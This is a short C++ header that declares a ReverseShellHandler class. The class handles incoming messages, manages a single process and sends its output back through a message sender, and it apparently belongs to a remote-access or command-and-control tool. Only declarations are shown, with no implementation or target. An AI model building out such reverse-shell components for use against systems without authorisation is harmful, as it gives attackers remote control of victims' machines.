#pragma once
#include <memory>

#include "IMessageHandler.h"
#include "IMessageSender.h"
#include "ISingleProcessManager.h"

class ReverseShellHandler : public IMessageHandler
{
public:
	ReverseShellHandler(
		IMessageSender* sender);

	void Handle(MessageType type, std::span<char> content) override;

private:
	void ReadOutput(std::string line) const;

	IMessageSender* _sender;
	std::unique_ptr<ISingleProcessManager> _manager;
};

